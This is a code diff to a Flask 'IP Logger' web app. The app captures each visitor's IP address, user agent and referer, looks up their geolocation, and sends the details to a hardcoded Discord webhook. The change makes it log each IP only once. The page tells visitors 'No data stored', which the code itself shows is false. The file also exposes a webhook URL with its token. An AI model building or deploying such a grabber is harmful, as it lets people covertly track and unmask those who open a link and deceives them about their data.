@@ -7,6 +7,9 @@ app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1531275791600455920/eqjzGUGNuyHBs9awFBnwWJwV-HLZ_lgNtygrbi_jcUnU8BHiKWhLNh3bnaoM3TA2Nov5"
 
+# In-memory set to track unique IPs
+seen_ips = set()
+
 def get_geolocation(ip):
     try:
         resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=4)
@@ -30,7 +33,7 @@ def send_to_discord(ip, user_agent, referer):
             {"name": "User Agent", "value": user_agent[:150] + ("..." if len(user_agent) > 150 else ""), "inline": False},
             {"name": "Referer", "value": referer or "Direct visit", "inline": True}
         ],
-        "footer": {"text": "Render IP Logger | Live"}
+        "footer": {"text": "Render IP Logger | Unique IP only"}
     }
     payload = {"embeds": [embed]}
     try:
@@ -140,6 +143,16 @@ HTML_PAGE = """
             margin-top: 8px;
             opacity: 0.8;
         }
+        .seen-badge {
+            display: inline-block;
+            background: #00ff0022;
+            border: 1px solid #00ff0044;
+            border-radius: 20px;
+            padding: 4px 16px;
+            font-size: 12px;
+            color: #88ff88;
+            margin-top: 12px;
+        }
     </style>
 </head>
 <body>
@@ -148,22 +161,15 @@ HTML_PAGE = """
         <div class="icon">🌐</div>
         <h1>IP Logger</h1>
         <div class="ip-display">{ip}</div>
-        <div class="geo" id="geo">📍 Geolocation loading...</div>
+        <div class="geo">📍 Logged – check Discord for full details</div>
         <div class="status">
             <span class="dot"></span>
-            <span>Logged successfully</span>
+            <span>{status_text}</span>
             <span class="checkmark">✔</span>
         </div>
+        <div class="seen-badge">{badge_text}</div>
         <div class="sub">🔒 Secure · One-time log · No data stored</div>
     </div>
-    <script>
-        // Optional: fetch geolocation via client-side for display (already server-side)
-        // This is just for show – the real data is in Discord.
-        const geoEl = document.getElementById('geo');
-        // You could leave it static or remove the loading text.
-        // We'll just update it to a friendly message.
-        geoEl.textContent = '📍 Logged – check Discord for full details';
-    </script>
 </body>
 </html>
 """
@@ -173,10 +179,23 @@ def log_ip():
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if visitor_ip and ',' in visitor_ip:
         visitor_ip = visitor_ip.split(',')[0].strip()
+    
+    # Check if IP already seen
+    if visitor_ip in seen_ips:
+        status_text = "Already logged – duplicate ignored"
+        badge_text = "♻️ Duplicate request – no new log"
+        # Return HTML without sending to Discord
+        return HTML_PAGE.format(ip=visitor_ip, status_text=status_text, badge_text=badge_text), 200
+    
+    # New IP – log it
+    seen_ips.add(visitor_ip)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     referer = request.headers.get('Referer')
     send_to_discord(visitor_ip, user_agent, referer)
-    return HTML_PAGE.format(ip=visitor_ip), 200
+    
+    status_text = "Logged successfully – first visit"
+    badge_text = "✅ New IP logged to Discord"
+    return HTML_PAGE.format(ip=visitor_ip, status_text=status_text, badge_text=badge_text), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
